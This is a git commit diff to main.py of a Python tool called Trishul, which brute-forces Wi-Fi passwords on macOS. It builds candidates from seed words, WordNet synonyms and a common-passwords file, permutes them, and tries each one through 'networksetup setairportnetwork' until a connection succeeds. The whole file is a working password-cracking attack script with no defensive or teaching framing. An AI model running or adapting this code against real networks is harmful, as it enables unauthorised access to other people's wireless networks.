1c9b5f4a157c18f35375fd745529ec9e266323ad
Chris McComb <ccmcc2012@gmail.com>
2021-08-13 14:31:02 -0400

    newnew

--- main.py
+++ main.py
@@ -2,25 +2,29 @@ import itertools
 import subprocess
 import nltk; nltk.download('wordnet')
 from nltk.corpus import wordnet
+import pandas
+import pkg_resources
 
 
 class Trishul:
 
-    def __init__(self, device: str, network: str, initial_seed_words: list[str] = None, combination_depth: int = 3):
+    def __init__(self, device: str, network: str, initial_seed_words: list[str] = [], combination_depth: int = 3):
         self.device = device
         self.network = network
         self.initial_seed_words = initial_seed_words
-        self.seed_words = []
+        self.seed_words = initial_seed_words[:]
         self.combination_depth = combination_depth
+        self.password = None
 
-    def expand_seed_words(self):
-        seed_words = self.initial_seed_words[:]
+    def expand_seed_words_with_wordnet(self):
+        seed_words = self.seed_words[:]
         for word in self.initial_seed_words:
             [[seed_words.append(name.name()) for name in lemma.lemmas()] for lemma in wordnet.synsets(word)]
         self.seed_words = list(set(seed_words))
+        return self
 
     def make_password_iterator(self) -> iter:
-        return itertools.permutations(self.seed_words, COMBINATION_DEPTH)
+        return itertools.permutations(self.seed_words, self.combination_depth)
 
     def login(self, password: str) -> subprocess.CompletedProcess:
         command = " ".join(["networksetup", "setairportnetwork", self.device, self.network, password])
@@ -34,15 +38,21 @@ class Trishul:
             output = self.login(password)
             print(output.stdout)
             if len(output.stdout) == 0:
+                self.password = password
                 return {"status": 0, "message": "Password found!", "password": password}
-        return {"status": 1, "message": "Password not found.", "password": None}
+        return {"status": 1,
+                "message": "Password not found.",
+                "password": None}
+
+    def add_common_passwords(self):
+        passwords = pandas.read_csv('data/common-passwords.txt', header=None)
+        self.seed_words += list(passwords[0].values)
+        return self
 
     def run(self) -> dict:
-        self.expand_seed_words()
         passwords = self.make_password_iterator()
         return self.try_passwords(passwords)
 
-
 if __name__ == "__main__":
-    print(Trishul("en0", "JuliusCaesar", ["roman", "emperor"], 3).run())
+    print(Trishul("en0", "JuliusCaesar", ["roman", "emperor"], 1).add_common_passwords().run())
 
